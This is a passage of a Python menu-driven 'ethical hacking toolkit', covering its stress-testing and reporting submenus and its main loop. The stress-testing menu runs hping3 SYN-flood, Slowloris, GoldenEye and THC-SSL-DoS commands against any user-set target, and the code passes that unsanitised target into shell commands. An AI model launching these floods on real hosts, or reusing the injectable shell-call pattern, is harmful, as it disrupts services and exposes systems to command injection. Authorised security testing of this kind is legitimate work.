    def stress_testing_menu(self):
        """Stress Testing Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ STRESS TESTING ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Hping3 - DoS Testing")
            print(f"{Colors.GREEN}[2]{Colors.END} Slowloris - Slow Attack")
            print(f"{Colors.GREEN}[3]{Colors.END} GoldenEye - HTTP DoS")
            print(f"{Colors.GREEN}[4]{Colors.END} THC-SSL-DoS")
            print(f"{Colors.GREEN}[5]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                os.system(f"hping3 -S --flood -V -p 80 {self.target}")
            elif choice == "2":
                os.system(f"slowloris {self.target}")
            elif choice == "3":
                os.system(f"goldeneye {self.target}")
            elif choice == "4":
                os.system(f"thc-ssl-dos {self.target}")
            elif choice == "5":
                break
                
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
            
    # ============= REPORTING =============
    def reporting_menu(self):
        """Reporting Tools Submenu"""
        while True:
            os.system("clear" if os.name == "posix" else "cls")
            print(f"{Colors.BOLD}{Colors.CYAN}[ REPORTING TOOLS ]{Colors.END}\n")
            print(f"{Colors.GREEN}[1]{Colors.END} Generate HTML Report")
            print(f"{Colors.GREEN}[2]{Colors.END} Generate PDF Report")
            print(f"{Colors.GREEN}[3]{Colors.END} View Log File")
            print(f"{Colors.GREEN}[4]{Colors.END} Clear Logs")
            print(f"{Colors.GREEN}[5]{Colors.END} Back to Main Menu")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option: {Colors.END}")
            
            if choice == "1":
                self.generate_html_report()
            elif choice == "2":
                self.generate_pdf_report()
            elif choice == "3":
                if os.path.exists(self.log_file):
                    os.system(f"cat {self.log_file}")
                else:
                    print(f"{Colors.RED}[!] No log file found{Colors.END}")
            elif choice == "4":
                open(self.log_file, 'w').close()
                print(f"{Colors.GREEN}[+] Logs cleared{Colors.END}")
            elif choice == "5":
                break
                
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
            
    def generate_html_report(self):
        """Generate HTML report"""
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Assessment Report</title>
    <style>
        body {{ font-family: Arial; margin: 40px; }}
        h1 {{ color: #333; }}
        .header {{ background: #4CAF50; color: white; padding: 20px; }}
        .section {{ margin: 20px 0; padding: 10px; border: 1px solid #ddd; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Ethical Hacking Assessment Report</h1>
        <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Target: {self.target}</p>
    </div>
    <div class="section">
        <h2>Scan Results</h2>
        <p>Check output directory for detailed results: {self.output_dir}</p>
    </div>
</body>
</html>
        """
        
        report_file = f"{self.output_dir}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_file, 'w') as f:
            f.write(html_content)
        print(f"{Colors.GREEN}[+] Report generated: {report_file}{Colors.END}")
        
    def generate_pdf_report(self):
        """Generate PDF report (requires wkhtmltopdf)"""
        html_file = f"{self.output_dir}/temp_report.html"
        pdf_file = f"{self.output_dir}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        
        self.generate_html_report()  # Generate HTML first
        
        try:
            os.system(f"wkhtmltopdf {html_file} {pdf_file}")
            print(f"{Colors.GREEN}[+] PDF report generated: {pdf_file}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] wkhtmltopdf not installed{Colors.END}")
            
    def update_toolkit(self):
        """Update toolkit and tools"""
        print(f"{Colors.YELLOW}[*] Updating toolkit...{Colors.END}")
        os.system("apt-get update && apt-get upgrade -y")
        print(f"{Colors.GREEN}[+] Update complete!{Colors.END}")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
        
    def run(self):
        """Main execution loop"""
        try:
            # Check if root
            self.check_root()
            
            while True:
                self.show_banner()
                
                # Show target if set
                if not self.target:
                    print(f"{Colors.YELLOW}[!] No target set! Use option 0 to set target{Colors.END}")
                    time.sleep(2)
                    self.set_target()
                    
                self.show_menu()
                
                choice = input(f"\n{Colors.BLUE}[?] Enter your choice: {Colors.END}")
                
                if choice == "0":
                    print(f"{Colors.GREEN}[+] Goodbye! Stay ethical!{Colors.END}")
                    sys.exit(0)
                elif choice == "1":
                    self.info_gathering_menu()
                elif choice == "2":
                    self.vuln_analysis_menu()
                elif choice == "3":
                    self.webapp_menu()
                elif choice == "4":
                    self.password_attacks_menu()
                elif choice == "5":
                    self.wireless_menu()
                elif choice == "6":
                    self.exploitation_menu()
                elif choice == "7":
                    self.sniffing_menu()
                elif choice == "8":
                    self.post_exploitation_menu()
                elif choice == "9":
                    self.forensics_menu()
                elif choice == "10":
                    self.database_menu()
                elif choice == "11":
                    self.stress_testing_menu()
                elif choice == "12":
                    self.reporting_menu()
                elif choice == "13":
                    self.update_toolkit()
                elif choice == "14":
                    confirm = input(f"{Colors.RED}[!] This will install many tools. Continue? (y/n): {Colors.END}")
                    if confirm.lower() == 'y':
                        self.install_tools()
                else:
                    print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Exiting...{Colors.END}")
            sys.exit(0)

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="All-in-One Ethical Hacking Toolkit")
    parser.add_argument("-t", "--target", help="Set target IP/Domain")
    parser.add_argument("--install", action="store_true", help="Install all tools")
    
    args = parser.parse_args()
    
    toolkit = EthicalHackingToolkit()
    
    if args.target:
        toolkit.target = args.target
        
    if args.install:
        toolkit.check_root()
        toolkit.install_tools()
    else:
        toolkit.run()

if __name__ == "__main__":
    main()